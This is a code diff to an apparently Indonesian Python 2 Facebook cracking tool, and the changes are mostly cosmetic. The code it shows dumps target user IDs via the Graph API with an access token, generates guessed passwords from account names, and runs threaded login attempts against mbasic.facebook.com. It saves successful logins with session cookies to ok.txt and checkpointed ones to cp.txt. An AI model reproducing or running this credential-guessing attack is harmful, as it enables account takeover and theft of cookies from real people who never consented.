@@ -285,8 +285,9 @@ def menu():
 	os.system("clear")
 	print logo
 	print
-	print("\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mHello \033[0;96m: "+nama)
-	print("\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mUID\033[0;96m   : "+id)
+	print("\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mHello \033[0;96m: "+nama);time.sleep(0.07)
+	print("\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mUID\033[0;96m   : "+id);time.sleep(0.07)
+	print("\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mTTL\033[0;96m   : "+a['birthday']);time.sleep(0.07)
 	print "\n\033[0;96m┌═══════════════════════════════════════┐"
 	print("\033[0;96m   [\033[0;97m1\033[0;96m]\033[0;97m Dump ID From Public/Friend")
 	print("\033[0;96m   [\033[0;97m2\033[0;96m]\033[0;97m Dump ID Followers")
@@ -327,6 +328,7 @@ def publik():
 	try:
                 os.system("clear")
                 print logo
+		print
 		print("\033[0;96m   [\033[0;97m•\033[0;96m]\033[0;97m Type \'me\' To Dump From Friendlist")
 		idt = raw_input("\033[0;96m   [\033[0;97m•\033[0;96m]\033[0;97m User ID Target :\033[0;96m ")
 		try:
@@ -364,7 +366,8 @@ def follow():
 		logs()
 	try:
                 os.system("clear")
-                banner()
+                print logo
+		print
 		idt = raw_input("\033[0;96m   [\033[0;97m•\033[0;96m]\033[0;97m Followers ID Target :\033[0;96m ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -437,10 +440,10 @@ def generate(text):
 			else:
 				results.append(i+"123")
 				results.append(i+"12345")
-				results.append(i)
+				results.append(i+"1234")
 				if "bismillah" in ips:
 					results.append("sayang")
-					results.append("anjing")
+					results.append("qwerty")
 	return results
 
 def logs():
@@ -515,11 +518,11 @@ class crack:
 						except:continue
 				except Exception as e:
 					print ("   %s"%e)
-				print ("\033[0;96m   [\033[0;97m•\033[0;96m]\033[0;97m Crack Started...")
-                print ("\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [OK] Saved to : ok.txt\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [CP] Saved to : cp.txt")
+				print ('\033[0;96m   [\033[0;97m•\033[0;96m]\033[0;97m Crack Started...')
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				print("\n\x1b[0;36m   [\033[0;97m•\033[0;96m]\033[0;97m Finished")
+				print('\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [OK] Saved to : ok.txt\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [CP] Saved to : cp.txt')
 				break
 	def pwlist(self):
 		self.pw=raw_input("  \033[0;96m [\033[0;97m•\033[0;96m] \033[0;97mPassword List :\033[0;96m ").split(",")
@@ -529,17 +532,17 @@ class crack:
 			for i in self.fl:
 				i.update({"pw":self.pw})
 			print ('\033[0;96m   [\033[0;97m•\033[0;96m]\033[0;97m Crack Started...')
-            print ('\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [OK] Saved to : ok.txt\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [CP] Saved to : cp.txt')
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			print("\n\x1b[0;36m   [\033[0;97m•\033[0;96m]\033[0;97m Finished")
+			print('\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [OK] Saved to : ok.txt\033[0;96m   [\033[0;97m•\033[0;96m] \033[0;97mAccount [CP] Saved to : cp.txt')
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[0;32m   [OK] %s • %s               "%(fl.get("id"),i))
+					print("\r\x1b[0;36m   [OK] %s • %s               "%(fl.get("id"),i))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -549,7 +552,7 @@ class crack:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r\x1b[0;33m   [CP] %s • %s               "%(fl.get("id"),i))
+					print("\r\x1b[0;37m   [CP] %s • %s               "%(fl.get("id"),i))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
